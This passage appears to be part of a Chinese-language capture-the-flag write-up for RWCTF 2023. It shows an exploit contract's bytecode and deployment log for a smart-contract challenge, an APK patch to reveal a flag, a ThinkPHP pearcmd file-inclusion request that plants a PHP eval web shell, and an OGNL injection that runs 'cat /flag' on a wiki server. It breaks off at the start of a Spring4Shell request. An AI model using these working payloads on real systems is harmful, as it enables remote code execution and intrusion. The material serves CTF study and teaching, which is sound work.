&#39;isSolved&#39;, &#39;outputs&#39;: [{&#39;internalType&#39;: &#39;bool&#39;, &#39;name&#39;: &#39;&#39;, &#39;type&#39;: &#39;bool&#39;}], &#39;stateMutability&#39;: &#39;view&#39;, &#39;type&#39;: &#39;function&#39;}]
+</span></span><span class=line><span class=cl>[Bytecode]608060405234801561001057600080fd5b50610f18806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806347ae43181461004657806364d98f6e14610062578063d78046e714610080575b600080fd5b610060600480360381019061005b9190610b72565b61009c565b005b61006a6108a2565b6040516100779190610d1e565b60405180910390f35b61009a60048036038101906100959190610bae565b610948565b005b816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633884d6356040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561014457600080fd5b505af1158015610158573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630fc63d106040518163ffffffff1660e01b815260040160206040518083038186803b1580156101c257600080fd5b505afa1580156101d6573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101fa9190610b49565b600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635f64b55b6040518163ffffffff1660e01b815260040160206040518083038186803b1580156102a057600080fd5b505afa1580156102b4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102d89190610b49565b600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600080600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16106103dd57600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16610424565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff165b9150915073a2a21fe2fd692b63df06ecd5b0a783323b4eae36600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e6a4390583836040518363ffffffff1660e01b81526004016104da929190610ccc565b60206040518083038186803b1580156104f257600080fd5b505afa158015610506573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061052a9190610b49565b600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156106d457600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663022c0d9f6000670de0b6b3a764000030600167ffffffffffffffff81111561064b577f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6040519080825280601f01601f19166020018201604052801561067d5781602001600182028036833780820191505090505b506040518563ffffffff1660e01b815260040161069d9493929190610d39565b600060405180830381600087803b1580156106b757600080fd5b505af11580156106cb573d6000803e3d6000fd5b505050506107e4565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663022c0d9f670de0b6b3a7640000600030600167ffffffffffffffff81111561075f577f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6040519080825280601f01601f1916602001820160405280156107915781602001600182028036833780820191505090505b506040518563ffffffff1660e01b81526004016107b19493929190610d85565b600060405180830381600087803b1580156107cb57600080fd5b505af11580156107df573d6000803e3d6000fd5b505050505b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb84670de0b6b3a76400006040518363ffffffff1660e01b8152600401610849929190610cf5565b602060405180830381600087803b15801561086357600080fd5b505af1158015610877573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061089b9190610c2e565b5050505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166364d98f6e6040518163ffffffff1660e01b815260040160206040518083038186803b15801561090b57600080fd5b505afa15801561091f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109439190610c2e565b905090565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fff6cae96040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156109b257600080fd5b505af11580156109c6573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a76400006040518363ffffffff1660e01b8152600401610a51929190610cf5565b602060405180830381600087803b158015610a6b57600080fd5b505af1158015610a7f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610aa39190610c2e565b505050505050565b600081359050610aba81610e9d565b92915050565b600081519050610acf81610e9d565b92915050565b600081519050610ae481610eb4565b92915050565b60008083601f840112610afc57600080fd5b8235905067ffffffffffffffff811115610b1557600080fd5b602083019150836001820283011115610b2d57600080fd5b9250929050565b600081359050610b4381610ecb565b92915050565b600060208284031215610b5b57600080fd5b6000610b6984828501610ac0565b91505092915050565b60008060408385031215610b8557600080fd5b6000610b9385828601610aab565b9250506020610ba485828601610aab565b9150509250929050565b600080600080600060808688031215610bc657600080fd5b6000610bd488828901610aab565b9550506020610be588828901610b34565b9450506040610bf688828901610b34565b935050606086013567ffffffffffffffff811115610c1357600080fd5b610c1f88828901610aea565b92509250509295509295909350565b600060208284031215610c4057600080fd5b6000610c4e84828501610ad5565b91505092915050565b610c6081610ded565b82525050565b610c6f81610dff565b82525050565b6000610c8082610dd1565b610c8a8185610ddc565b9350610c9a818560208601610e59565b610ca381610e8c565b840191505092915050565b610cb781610e35565b82525050565b610cc681610e47565b82525050565b6000604082019050610ce16000830185610c57565b610cee6020830184610c57565b9392505050565b6000604082019050610d0a6000830185610c57565b610d176020830184610cbd565b9392505050565b6000602082019050610d336000830184610c66565b92915050565b6000608082019050610d4e6000830187610cae565b610d5b6020830186610cbd565b610d686040830185610c57565b8181036060830152610d7a8184610c75565b905095945050505050565b6000608082019050610d9a6000830187610cbd565b610da76020830186610cae565b610db46040830185610c57565b8181036060830152610dc68184610c75565b905095945050505050565b600081519050919050565b600082825260208201905092915050565b6000610df882610e0b565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b6000610e4082610e2b565b9050919050565b6000610e5282610e2b565b9050919050565b60005b83811015610e77578082015181840152602081019050610e5c565b83811115610e86576000848401525b50505050565b6000601f19601f8301169050919050565b610ea681610ded565b8114610eb157600080fd5b50565b610ebd81610dff565b8114610ec857600080fd5b50565b610ed481610e2b565b8114610edf57600080fd5b5056fea2646970667358221220d2c43a8f74db54ede8223494291882f9de0436050f7c95b636f32c8afbadd1a764736f6c63430008000033
+</span></span><span class=line><span class=cl>2023-01-07 22:54:39.763 | INFO     | Poseidon.Blockchain:DeployContract:418 - 
+</span></span><span class=line><span class=cl>[Account][DeployContract]
+</span></span><span class=line><span class=cl>[TransactionHash]0xcef95b48e3d6c03f734ebd4c3a4a2372b2b4360bae5dac4def46a5e9b2febc1f
+</span></span><span class=line><span class=cl>[Txn]{
+</span></span><span class=line><span class=cl>  &#34;chainId&#34;: 1712,
+</span></span><span class=line><span class=cl>  &#34;from&#34;: &#34;0x4109F583C2e0916a5972d567cC32A78fc20503aC&#34;,
+</span></span><span class=line><span class=cl>  &#34;nonce&#34;: 0,
+</span></span><span class=line><span class=cl>  &#34;value&#34;: 0,
+</span></span><span class=line><span class=cl>  &#34;gasPrice&#34;: 1000000000,
+</span></span><span class=line><span class=cl>  &#34;gas&#34;: 886169,
+</span></span><span class=line><span class=cl>  &#34;data&#34;: &#34;0x608060405234801561001057600080fd5b50610f18806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806347ae43181461004657806364d98f6e14610062578063d78046e714610080575b600080fd5b610060600480360381019061005b9190610b72565b61009c565b005b61006a6108a2565b6040516100779190610d1e565b60405180910390f35b61009a60048036038101906100959190610bae565b610948565b005b816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633884d6356040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561014457600080fd5b505af1158015610158573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630fc63d106040518163ffffffff1660e01b815260040160206040518083038186803b1580156101c257600080fd5b505afa1580156101d6573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101fa9190610b49565b600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635f64b55b6040518163ffffffff1660e01b815260040160206040518083038186803b1580156102a057600080fd5b505afa1580156102b4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102d89190610b49565b600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600080600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16106103dd57600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16610424565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff165b9150915073a2a21fe2fd692b63df06ecd5b0a783323b4eae36600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e6a4390583836040518363ffffffff1660e01b81526004016104da929190610ccc565b60206040518083038186803b1580156104f257600080fd5b505afa158015610506573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061052a9190610b49565b600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156106d457600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663022c0d9f6000670de0b6b3a764000030600167ffffffffffffffff81111561064b577f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6040519080825280601f01601f19166020018201604052801561067d5781602001600182028036833780820191505090505b506040518563ffffffff1660e01b815260040161069d9493929190610d39565b600060405180830381600087803b1580156106b757600080fd5b505af11580156106cb573d6000803e3d6000fd5b505050506107e4565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663022c0d9f670de0b6b3a7640000600030600167ffffffffffffffff81111561075f577f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6040519080825280601f01601f1916602001820160405280156107915781602001600182028036833780820191505090505b506040518563ffffffff1660e01b81526004016107b19493929190610d85565b600060405180830381600087803b1580156107cb57600080fd5b505af11580156107df573d6000803e3d6000fd5b505050505b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb84670de0b6b3a76400006040518363ffffffff1660e01b8152600401610849929190610cf5565b602060405180830381600087803b15801561086357600080fd5b505af1158015610877573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061089b9190610c2e565b5050505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166364d98f6e6040518163ffffffff1660e01b815260040160206040518083038186803b15801561090b57600080fd5b505afa15801561091f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109439190610c2e565b905090565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fff6cae96040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156109b257600080fd5b505af11580156109c6573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a76400006040518363ffffffff1660e01b8152600401610a51929190610cf5565b602060405180830381600087803b158015610a6b57600080fd5b505af1158015610a7f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610aa39190610c2e565b505050505050565b600081359050610aba81610e9d565b92915050565b600081519050610acf81610e9d565b92915050565b600081519050610ae481610eb4565b92915050565b60008083601f840112610afc57600080fd5b8235905067ffffffffffffffff811115610b1557600080fd5b602083019150836001820283011115610b2d57600080fd5b9250929050565b600081359050610b4381610ecb565b92915050565b600060208284031215610b5b57600080fd5b6000610b6984828501610ac0565b91505092915050565b60008060408385031215610b8557600080fd5b6000610b9385828601610aab565b9250506020610ba485828601610aab565b9150509250929050565b600080600080600060808688031215610bc657600080fd5b6000610bd488828901610aab565b9550506020610be588828901610b34565b9450506040610bf688828901610b34565b935050606086013567ffffffffffffffff811115610c1357600080fd5b610c1f88828901610aea565b92509250509295509295909350565b600060208284031215610c4057600080fd5b6000610c4e84828501610ad5565b91505092915050565b610c6081610ded565b82525050565b610c6f81610dff565b82525050565b6000610c8082610dd1565b610c8a8185610ddc565b9350610c9a818560208601610e59565b610ca381610e8c565b840191505092915050565b610cb781610e35565b82525050565b610cc681610e47565b82525050565b6000604082019050610ce16000830185610c57565b610cee6020830184610c57565b9392505050565b6000604082019050610d0a6000830185610c57565b610d176020830184610cbd565b9392505050565b6000602082019050610d336000830184610c66565b92915050565b6000608082019050610d4e6000830187610cae565b610d5b6020830186610cbd565b610d686040830185610c57565b8181036060830152610d7a8184610c75565b905095945050505050565b6000608082019050610d9a6000830187610cbd565b610da76020830186610cae565b610db46040830185610c57565b8181036060830152610dc68184610c75565b905095945050505050565b600081519050919050565b600082825260208201905092915050565b6000610df882610e0b565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b6000610e4082610e2b565b9050919050565b6000610e5282610e2b565b9050919050565b60005b83811015610e77578082015181840152602081019050610e5c565b83811115610e86576000848401525b50505050565b6000601f19601f8301169050919050565b610ea681610ded565b8114610eb157600080fd5b50565b610ebd81610dff565b8114610ec857600080fd5b50565b610ed481610e2b565b8114610edf57600080fd5b5056fea2646970667358221220d2c43a8f74db54ede8223494291882f9de0436050f7c95b636f32c8afbadd1a764736f6c63430008000033&#34;
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>2023-01-07 22:54:44.209 | SUCCESS  | Poseidon.Blockchain:__init__:559 - 
+</span></span><span class=line><span class=cl>[Contract][Instantiate]Successfully instantiated contract [0x1e104E8594299b97f568c3C271c374f6a45a5AeA].
+</span></span><span class=line><span class=cl>2023-01-07 22:54:44.214 | SUCCESS  | Poseidon.Blockchain:DeployContract:428 -
+</span></span><span class=line><span class=cl>[Account][DeployContract][Success]
+</span></span><span class=line><span class=cl>[TransactionHash]0xcef95b48e3d6c03f734ebd4c3a4a2372b2b4360bae5dac4def46a5e9b2febc1f
+</span></span><span class=line><span class=cl>[BlockNumber]65073
+</span></span><span class=line><span class=cl>[ContractAddress]0x1e104E8594299b97f568c3C271c374f6a45a5AeA
+</span></span><span class=line><span class=cl>[Value]0 [GasUsed]886169
+</span></span><span class=line><span class=cl>[Logs][]
+</span></span><span class=line><span class=cl>2023-01-07 22:54:44.367 | INFO     | Poseidon.Blockchain:CallFunction:577 - 
+</span></span><span class=line><span class=cl>[Contract][CallFunction]
+</span></span><span class=line><span class=cl>[ContractAddress]0x1e104E8594299b97f568c3C271c374f6a45a5AeA
+</span></span><span class=line><span class=cl>[Function]hack(&#39;0xc615a812208f7F380019C5fA442f6dcEE7F41B32&#39;, &#39;0xD1262D03B3F0f5aE0bDC8AB007C5D73E6036f848&#39;)
+</span></span><span class=line><span class=cl>2023-01-07 22:54:44.525 | INFO     | Poseidon.Blockchain:SendTransaction:323 - 
+</span></span><span class=line><span class=cl>[Account][SendTransaction][Traditional]
+</span></span><span class=line><span class=cl>[TransactionHash]0xe2293d0c28bdde56d04f4d4981af39f35255d21c21d610a19b4635a0665028a2
+</span></span><span class=line><span class=cl>[Txn]{
+</span></span><span class=line><span class=cl>  &#34;chainId&#34;: 1712,
+</span></span><span class=line><span class=cl>  &#34;from&#34;: &#34;0x4109F583C2e0916a5972d567cC32A78fc20503aC&#34;,
+</span></span><span class=line><span class=cl>  &#34;to&#34;: &#34;0x1e104E8594299b97f568c3C271c374f6a45a5AeA&#34;,
+</span></span><span class=line><span class=cl>  &#34;nonce&#34;: 1,
+</span></span><span class=line><span class=cl>  &#34;value&#34;: 0,
+</span></span><span class=line><span class=cl>  &#34;gasPrice&#34;: &#34;1 Gwei&#34;,
+</span></span><span class=line><span class=cl>  &#34;gas&#34;: 348108,
+</span></span><span class=line><span class=cl>  &#34;data&#34;: &#34;0x47ae4318000000000000000000000000c615a812208f7f380019c5fa442f6dcee7f41b32000000000000000000000000d1262d03b3f0f5ae0bdc8ab007c5d73e6036f848&#34;
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>2023-01-07 22:54:50.222 | SUCCESS  | Poseidon.Blockchain:SendTransaction:331 - 
+</span></span><span class=line><span class=cl>[Account][SendTransaction][Traditional][Success]
+</span></span><span class=line><span class=cl>[TransactionHash]0xe2293d0c28bdde56d04f4d4981af39f35255d21c21d610a19b4635a0665028a2
+</span></span><span class=line><span class=cl>[BlockNumber]65075
+</span></span><span class=line><span class=cl>[From]0x4109F583C2e0916a5972d567cC32A78fc20503aC
+</span></span><span class=line><span class=cl>[To]0x1e104E8594299b97f568c3C271c374f6a45a5AeA
+</span></span><span class=line><span class=cl>[Value]0 [GasUsed]290437
+</span></span><span class=line><span class=cl>[Data]0x47ae4318000000000000000000000000c615a812208f7f380019c5fa442f6dcee7f41b32000000000000000000000000d1262d03b3f0f5ae0bdc8ab007c5d73e6036f848
+</span></span><span class=line><span class=cl>[Logs][AttributeDict({&#39;address&#39;: &#39;0x46CFcDa5819F8e98e17Ea901ab1D34843FF8De99&#39;, &#39;topics&#39;: [HexBytes(&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;), HexBytes(&#39;0x000000000000000000000000c615a812208f7f380019c5fa442f6dcee7f41b32&#39;), HexBytes(&#39;0x0000000000000000000000001e104e8594299b97f568c3c271c374f6a45a5aea&#39;)], &#39;data&#39;: &#39;0x0000000000000000000000000000000000000000000000000de0b6b3a7640000&#39;, &#39;blockNumber&#39;: 65075, &#39;transactionHash&#39;: HexBytes(&#39;0xe2293d0c28bdde56d04f4d4981af39f35255d21c21d610a19b4635a0665028a2&#39;), &#39;transactionIndex&#39;: 0, &#39;blockHash&#39;: HexBytes(&#39;0x3943bafcf7bb0c5762372b1939c2ee6ac846b9c9c66d3b63dad000493bca1442&#39;), &#39;logIndex&#39;: 0, &#39;removed&#39;: False}), AttributeDict({&#39;address&#39;: &#39;0xC5CeFf49C87aF413aC90973e0a9c419e8788CADB&#39;, &#39;topics&#39;: [HexBytes(&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;), HexBytes(&#39;0x000000000000000000000000c3a4ed176600f1b5c6cdaa74c76d7ebf6275ba7c&#39;), HexBytes(&#39;0x0000000000000000000000001e104e8594299b97f568c3c271c374f6a45a5aea&#39;)], &#39;data&#39;: &#39;0x0000000000000000000000000000000000000000000000000de0b6b3a7640000&#39;, &#39;blockNumber&#39;: 65075, &#39;transactionHash&#39;: HexBytes(&#39;0xe2293d0c28bdde56d04f4d4981af39f35255d21c21d610a19b4635a0665028a2&#39;), &#39;transactionIndex&#39;: 0, &#39;blockHash&#39;: HexBytes(&#39;0x3943bafcf7bb0c5762372b1939c2ee6ac846b9c9c66d3b63dad000493bca1442&#39;), &#39;logIndex&#39;: 1, &#39;removed&#39;: False}), AttributeDict({&#39;address&#39;: &#39;0xc3A4eD176600F1b5c6CDaa74c76d7ebf6275ba7c&#39;, &#39;topics&#39;: [HexBytes(&#39;0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1&#39;)], &#39;data&#39;: &#39;0x0000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000000000000000000000000000007ce66c50e2840000&#39;, &#39;blockNumber&#39;: 65075, &#39;transactionHash&#39;: HexBytes(&#39;0xe2293d0c28bdde56d04f4d4981af39f35255d21c21d610a19b4635a0665028a2&#39;), &#39;transactionIndex&#39;: 0, &#39;blockHash&#39;: HexBytes(&#39;0x3943bafcf7bb0c5762372b1939c2ee6ac846b9c9c66d3b63dad000493bca1442&#39;), &#39;logIndex&#39;: 2, &#39;removed&#39;: False}), AttributeDict({&#39;address&#39;: &#39;0x46CFcDa5819F8e98e17Ea901ab1D34843FF8De99&#39;, &#39;topics&#39;: [HexBytes(&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;), HexBytes(&#39;0x0000000000000000000000001e104e8594299b97f568c3c271c374f6a45a5aea&#39;), HexBytes(&#39;0x000000000000000000000000c3a4ed176600f1b5c6cdaa74c76d7ebf6275ba7c&#39;)], &#39;data&#39;: &#39;0x0000000000000000000000000000000000000000000000000de0b6b3a7640000&#39;, &#39;blockNumber&#39;: 65075, &#39;transactionHash&#39;: HexBytes(&#39;0xe2293d0c28bdde56d04f4d4981af39f35255d21c21d610a19b4635a0665028a2&#39;), &#39;transactionIndex&#39;: 0, &#39;blockHash&#39;: HexBytes(&#39;0x3943bafcf7bb0c5762372b1939c2ee6ac846b9c9c66d3b63dad000493bca1442&#39;), &#39;logIndex&#39;: 3, &#39;removed&#39;: False}), AttributeDict({&#39;address&#39;: &#39;0xc3A4eD176600F1b5c6CDaa74c76d7ebf6275ba7c&#39;, &#39;topics&#39;: [HexBytes(&#39;0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1&#39;)], &#39;data&#39;: &#39;0x00000000000000000000000000000000000000000000000098a7d9b8314c00000000000000000000000000000000000000000000000000007ce66c50e2840000&#39;, &#39;blockNumber&#39;: 65075, &#39;transactionHash&#39;: HexBytes(&#39;0xe2293d0c28bdde56d04f4d4981af39f35255d21c21d610a19b4635a0665028a2&#39;), &#39;transactionIndex&#39;: 0, &#39;blockHash&#39;: HexBytes(&#39;0x3943bafcf7bb0c5762372b1939c2ee6ac846b9c9c66d3b63dad000493bca1442&#39;), &#39;logIndex&#39;: 4, &#39;removed&#39;: False}), AttributeDict({&#39;address&#39;: &#39;0xc3A4eD176600F1b5c6CDaa74c76d7ebf6275ba7c&#39;, &#39;topics&#39;: [HexBytes(&#39;0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822&#39;), HexBytes(&#39;0x0000000000000000000000001e104e8594299b97f568c3c271c374f6a45a5aea&#39;), HexBytes(&#39;0x0000000000000000000000001e104e8594299b97f568c3c271c374f6a45a5aea&#39;)], &#39;data&#39;: &#39;0x0000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000000000000000000000000000000de0b6b3a764000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000de0b6b3a7640000&#39;, &#39;blockNumber&#39;: 65075, &#39;transactionHash&#39;: HexBytes(&#39;0xe2293d0c28bdde56d04f4d4981af39f35255d21c21d610a19b4635a0665028a2&#39;), &#39;transactionIndex&#39;: 0, &#39;blockHash&#39;: HexBytes(&#39;0x3943bafcf7bb0c5762372b1939c2ee6ac846b9c9c66d3b63dad000493bca1442&#39;), &#39;logIndex&#39;: 5, &#39;removed&#39;: False}), AttributeDict({&#39;address&#39;: &#39;0xC5CeFf49C87aF413aC90973e0a9c419e8788CADB&#39;, &#39;topics&#39;: [HexBytes(&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;), HexBytes(&#39;0x0000000000000000000000001e104e8594299b97f568c3c271c374f6a45a5aea&#39;), HexBytes(&#39;0x000000000000000000000000d1262d03b3f0f5ae0bdc8ab007c5d73e6036f848&#39;)], &#39;data&#39;: &#39;0x0000000000000000000000000000000000000000000000000de0b6b3a7640000&#39;, &#39;blockNumber&#39;: 65075, &#39;transactionHash&#39;: HexBytes(&#39;0xe2293d0c28bdde56d04f4d4981af39f35255d21c21d610a19b4635a0665028a2&#39;), &#39;transactionIndex&#39;: 0, &#39;blockHash&#39;: HexBytes(&#39;0x3943bafcf7bb0c5762372b1939c2ee6ac846b9c9c66d3b63dad000493bca1442&#39;), &#39;logIndex&#39;: 6, &#39;removed&#39;: False})]
+</span></span><span class=line><span class=cl>2023-01-07 22:54:50.323 | SUCCESS  | Poseidon.Blockchain:ReadOnlyCallFunction:612 - 
+</span></span><span class=line><span class=cl>[Contract][ReadOnlyCallFunction]
+</span></span><span class=line><span class=cl>[ContractAddress]0x1e104E8594299b97f568c3C271c374f6a45a5AeA
+</span></span><span class=line><span class=cl>[Function]isSolved()
+</span></span><span class=line><span class=cl>[Result]True
+</span></span></code></pre></td></tr></table></div></div><h2 id=snake>snake</h2><p>apktools 反编译得到smai代码，然后把图中this.length>55条件取反，再编译成apk正常玩游戏，吃掉第一个后面的接着就是flag
+这里是对蛇的长度判读，正常玩需要长度大于55后才会出现flag，取反后可以直接出现flag。
+<img src=/img/2023-01-10-RWCTF/2.png alt></p><h2 id=be-a-language-expert>Be-a-Language-Expert</h2><p>tp已知洞</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_REQUEST[&#39;a&#39;]);?&gt;+/tmp/b.php HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 47.98.124.175:8080
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>Pragma: no-cache
+</span></span><span class=line><span class=cl>Cache-Control: no-cache
+</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2023-01-10-RWCTF/3.png alt></p><h2 id=babycurve>babyCurve</h2><p>曲线方程数学公式: $ y^{2}=x^{3}+2x^{2}+x $，离散对数4470735776084208177429085432176719338，计算子群的阶，找真正的离散对数值。</p><h2 id=be-a-wiki-hacker>Be-a-Wiki-Hacker</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET  //%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat%20/flag%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
+</span></span></code></pre></td></tr></table></div></div><h2 id=spring4shell>Spring4Shell</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST / HTTP/1.1
